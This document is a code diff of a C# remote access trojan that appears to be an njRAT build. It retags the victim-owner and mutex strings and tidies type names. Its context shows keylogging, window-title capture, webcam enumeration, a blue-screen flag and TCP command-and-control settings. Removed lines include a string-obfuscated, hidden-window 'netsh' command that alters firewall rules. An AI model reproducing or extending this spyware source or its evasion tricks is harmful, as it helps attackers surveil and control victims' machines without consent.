@@ -33,35 +33,35 @@ namespace j
 
         public static Mutex GlobalMutex;
 
-        public static String MutexName = "279f6960ed84a752570aca7fb2dc1552";
+        public static string MutexName = "T9sLkTsXnXvSo";
 
         public static FileInfo CurrentAssemblyFileInfo = new FileInfo(Application.ExecutablePath);
 
         public static Keylogger KeyloggerInstance = null;
 
-        public static Boolean BSoDActive = Convert.ToBoolean("False");
+        public static bool BSoDActive = Convert.ToBoolean("False");
 
-        public static Boolean IsConnected = false;
+        public static bool IsConnected = false;
 
-        public static String Splitter = "|'|'|";
+        public static string Splitter = "|'|'|";
 
-        public static String LastCapturedImageMD5 = "";
+        public static string LastCapturedImageMD5 = "";
 
         public static TcpClient CurrentTcpClient = null;
 
-        public static Byte[] BytesArray = new Byte[0x1401];
+        public static byte[] BytesArray = new byte[0x1401];
 
         public static MemoryStream Memory = new MemoryStream();
 
-        public static Object CurrentPlugin = null;
+        public static object CurrentPlugin = null;
 
-        public static String Host = "127.0.0.1";
+        public static string Host = "127.0.0.1";
 
-        public static String Port = "5552";
+        public static string Port = "5552";
 
-        public static String VictimsOwner = "SGFjS2Vk";
+        public static string VictimsOwner = "TllBTg==";
 
-        public static String Version = "0.7d";
+        public static string Version = "0.7D";
 
         #endregion
 
@@ -320,7 +320,7 @@ namespace j
                 }
 
                 StringBuilder sb = new StringBuilder(
-                    new String(' ', (GetWindowTextLength(foregroundWindow) + 1))
+                    new string(' ', (GetWindowTextLength(foregroundWindow) + 1))
                 );
 
                 GetWindowText(foregroundWindow, sb, sb.Length);
@@ -338,41 +338,6 @@ namespace j
         public static bool SendString(string s)
         {
             return SendBytes(StringToBytes(s));
-        }
-
-        private static bool CompareFileInfo(FileInfo leftFileInfo, FileInfo rightFileInfo)
-        {
-            if (leftFileInfo.Name.ToLower() == rightFileInfo.Name.ToLower())
-            {
-                DirectoryInfo leftDirectoryInfo = leftFileInfo.Directory;
-
-                DirectoryInfo rightDirectoryInfo = rightFileInfo.Directory;
-
-                do
-                {
-                    if (leftDirectoryInfo.Name.ToLower() != rightDirectoryInfo.Name.ToLower())
-                    {
-                        return false;
-                    }
-
-                    leftDirectoryInfo = leftDirectoryInfo.Parent;
-
-                    rightDirectoryInfo = rightDirectoryInfo.Parent;
-
-                    if ((leftDirectoryInfo == null) && (rightDirectoryInfo == null))
-                    {
-                        return true;
-                    }
-
-                    if (leftDirectoryInfo == null)
-                    {
-                        return false;
-                    }
-                }
-                while (rightDirectoryInfo != null);
-            }
-
-            return false;
         }
 
         public static void HandleData(byte[] b)
@@ -1087,23 +1052,6 @@ namespace j
 
             try
             {
-                Process p = Process.Start(new ProcessStartInfo
-                {
-                    FileName = "nzwezwtzwszwh".Replace("zw", ""),
-                    Arguments = "fizwrzwezwwalzwl dzwezwlzwezwte azwllowedprogrzwam \""
-                        .Replace("zw", "") + CurrentAssemblyFileInfo.FullName + "\"",
-                    CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
-            }
-            catch (Exception)
-            {
-
-            }
-
-
-            try
-            {
                 Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(MutexName, false);
             }
             catch (Exception)
@@ -1359,8 +1307,8 @@ namespace j
         //This function enables enumerate the web cam devices
         [DllImport("avicap32.dll")]
         protected static extern bool capGetDriverDescriptionA(short wDriverIndex,
-            [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName,
-           int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer);
+            [MarshalAs(UnmanagedType.VBByRefStr)]ref string lpszName,
+           int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);
 
         [Flags]
         enum FileSystemFeature : uint
